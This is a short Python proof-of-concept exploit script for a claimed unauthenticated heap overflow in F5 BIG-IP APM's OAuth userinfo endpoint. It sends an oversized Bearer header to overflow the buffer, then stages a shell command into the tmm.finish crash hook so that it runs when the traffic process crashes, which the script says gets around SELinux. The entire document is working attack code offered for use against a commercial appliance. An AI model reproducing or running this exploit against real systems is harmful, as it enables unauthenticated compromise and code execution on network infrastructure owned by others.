#!/usr/bin/env python3
"""CVE-2026-94127: F5 BIG-IP APM unauth heap overflow via oversized Bearer."""
import requests

TARGET = 'https://target.example.invalid'
USERINFO = TARGET + '/f5-oauth2/v1/userinfo'

# 0x4100-byte heap buffer in the OAuth userinfo flow; overflow it with a
# repeated Bearer value, no authentication required.
headers = {'Authorization': 'Bearer ' + 'A' * 0x4200}
r = requests.get(USERINFO, headers=headers, verify=False, timeout=30)
print(r.status_code)

# SELinux blocks direct exec, so stage commands through the tmm.finish crash
# hook, which Bash runs automatically when tmm crashes.
hook_cmd = 'id > /tmp/pwned'
stage = "echo '%s' >> /etc/bigstart/scripts/tmm.finish" % hook_cmd
print(stage)
